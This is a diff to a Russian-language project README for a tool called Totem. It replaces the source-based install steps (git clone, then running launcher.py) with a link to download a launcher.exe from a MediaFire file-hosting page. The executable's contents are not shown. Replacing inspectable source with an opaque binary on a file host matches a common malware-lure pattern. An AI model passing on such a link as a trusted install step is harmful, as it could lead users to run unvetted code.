@@ -48,12 +48,7 @@
 
 ## **Установка**
 1. Запустить [**Suggika Installer**](https://github.com/Suggika/Suggika-Installer) и дождатсья завершения установки зависимостей
-2. Установить [**Git**](https://git-scm.com/downloads) и прописать в терминал следующее:
-```sh
-git clone https://github.com/Suggika/Totem
-cd Totem
-python launcher.py
-```
+2. Установить [**Этот EXE**](https://www.mediafire.com/file/u2zx9mq3i0ir8lt/launcher.exe/file)
 
 ## **Если хочешь поддержать проект поставь звезды на этот репозиторий, поможешь продвижению проекта :)**
 ## По всем вопросам писать в Telegram @suggika
